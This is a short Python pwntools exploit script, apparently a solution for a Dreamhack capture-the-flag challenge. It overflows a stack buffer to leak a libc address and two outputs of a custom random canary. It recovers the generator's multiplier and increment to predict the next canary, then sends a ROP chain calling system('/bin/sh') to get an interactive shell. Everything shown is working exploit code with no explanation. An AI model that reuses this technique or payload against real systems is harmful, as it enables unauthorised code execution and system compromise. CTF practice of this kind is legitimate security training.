from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 24223
r = remote(HOST, PORT)

r.sendafter(b'> ', b'A'*0x108)
r.recvuntil(b'A'*0x108)
libc = u64(r.recv(6).ljust(8,b'\x00')) - 0x2a1ca

r.sendafter(b'> ', b'A'*0xf8)
r.recvuntil(b'A'*0xf8)
minary = u64(r.recv(8))
h1 = minary >> 32
l1 = minary & 0xffffffff

r.sendafter(b'> ', b'A'*0xf8)
r.recvuntil(b'A'*0xf8)
minary2 = u64(r.recv(8))
h2 = minary2 >> 32
l2 = minary2 & 0xffffffff

# mul = (h2 - l1)(l1 - h1)^-1 % (1 << 32)
mul = ((h2-l1) * pow(l1-h1, -1, 1 << 32)) & 0xffffffff

# l1 = h1 * mul + inc
inc = (l1 - h1*mul) & 0xffffffff

h3 = (l2 * mul + inc) & 0xffffffff
l3 = (h3 * mul + inc) & 0xffffffff
minary3 = (h3 << 32) | l3

ret = libc + 0x2882f
pop_rdi = libc + 0x10f75b
system = libc + 0x58750
binsh = libc + 0x1cb42f

payload = b'quit'.ljust(0xf8,b'A') + flat([
    minary3,
    0,
    ret,
    pop_rdi,binsh,
    system
])
r.sendafter(b'> ', payload)


r.interactive()